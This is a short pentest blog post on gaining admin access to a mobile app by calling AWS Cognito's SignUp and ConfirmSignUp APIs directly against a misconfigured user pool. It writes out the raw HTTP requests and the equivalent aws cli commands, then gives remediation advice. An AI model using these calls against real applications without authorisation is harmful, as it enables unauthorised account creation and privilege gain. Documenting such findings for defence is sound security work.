+++
date = '2025-02-01T10:20:20+04:00'
draft = false
title = 'Creating Admin user on Misconfigured AWS Cognito Instance'
hideSummary= true
+++

When I was working on an Android/iOS pentest engagement
I discovered that the application’s backend significantly depends on AWS Cognito

## What is AWS Cognito?
>Amazon Cognito is a service provided by Amazon Web Services (AWS) that simplifies the process of adding user authentication, authorization, and user management to your web and mobile applications. It allows developers to easily integrate sign-up, sign-in, and 
access control features into their applications without having to build and manage these capabilities from scratch.Users can sign in directly with a user name and password or via a third-party service such as Facebook, Amazon, Google, or Apple.


Even after bruteforcing no admin account signup page found and 3rd party login like facebook,google was also disabled.


Then I attempted to create an admin account by using the AWS Cognito API calls directly.

We can create a user by submitting an API call ```AWSCognitoIdentityProviderService.sign-up``` request.

```
POST / HTTP/1.1
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.SignUp
cache-control: no-cache
User-Agent: REDACTED
Accept: */*
Host: cognito-idp.us-west-2.amazonaws.com
Accept-Encoding: gzip, deflate
Content-Length: 251
Connection: close

{
"ClientId": "[READACTED]",
   "Username": "3p1c",
  "Password":"PASSWORD",
  "UserAttributes":[ { 
      "Name" : "email",
      "Value" : "3p1c@email.com"
 } ,{ 
      "Name" : "name",
      "Value" : "REDACTED"
 } 
 ]
}
```
and that request returns the confirmation code XXXXXX, which can be used to validate the Signup admin account.

Now sending API call ```AWSCognitoIdentityProviderService.ConfirmSignUp``` with confirmation code will validate our new administrator account.

```
POST / HTTP/1.1
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.ConfirmSignUp
cache-control: no-cache
User-Agent: REDACTED
Accept: */*
Host: cognito-idp.us-west-2.amazonaws.com
Accept-Encoding: gzip, deflate
Content-Length: 100
Connection: close

{
"ClientId": "REDACTED",
   "Username": "3p1c",
 "ConfirmationCode":"532977"
}
```

And now I can use my new login credentials to access admin privileges on iOS and Android app.


### With AWS cli 
The AWS cli tool can be used to make the same steps.

This command will generate a new account sign-up.
```
aws cognito-idp sign-up --client-id {REDACTED} --username 3p1c@email.com --password PASSWORD --user-attributes Name="email",Value="3p1c@email.com" Name="given_name",Value="Attacker" "Name"="family_name","Value"="Something" --region eu-west-2
```

This will validate our newly created account. 
```
aws cognito-idp confirm-sign-up --client-id {REDACTED} --username=3p1c@email.com --confirmation-code XXXXXX
```

### Recommendations
- Turn off AWS Cognito signup if it is not necessary.
- When configuring AWS Cognito for authenticated and unauthenticated identities, never grant more privileges than are required.
- Protect application users from unwanted access by utilizing Amazon Cognito’s sophisticated security features.
